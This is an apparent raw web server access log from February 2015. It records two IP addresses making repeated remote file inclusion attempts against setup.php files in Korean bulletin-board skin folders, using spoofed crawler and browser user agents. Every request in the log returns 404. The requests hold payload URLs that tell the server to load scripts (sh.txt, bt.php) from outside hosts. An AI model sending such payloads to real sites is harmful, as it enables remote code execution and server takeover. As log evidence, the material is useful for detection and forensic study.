37.9.169.17 - - [16/Feb/2015:20:59:15 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
37.9.169.17 - - [16/Feb/2015:20:59:16 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
37.9.169.17 - - [16/Feb/2015:20:59:17 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
37.9.169.17 - - [16/Feb/2015:20:59:18 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
181.65.186.35 - - [16/Feb/2015:20:59:44 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
181.65.186.35 - - [16/Feb/2015:20:59:46 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
181.65.186.35 - - [16/Feb/2015:20:59:46 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
181.65.186.35 - - [16/Feb/2015:20:59:47 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
181.65.186.35 - - [16/Feb/2015:20:59:49 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
181.65.186.35 - - [16/Feb/2015:20:59:52 -0800] "GET ////bbs/skin/minkoon_link_skyblue/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
181.65.186.35 - - [16/Feb/2015:20:59:52 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
181.65.186.35 - - [16/Feb/2015:20:59:53 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
181.65.186.35 - - [16/Feb/2015:21:00:32 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
181.65.186.35 - - [16/Feb/2015:21:00:34 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
181.65.186.35 - - [16/Feb/2015:21:00:34 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
181.65.186.35 - - [16/Feb/2015:21:00:35 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "IlTrovatore-Setaccio/1.2 (http://www.iltrovatore.it/aiuto/faq.html)" 
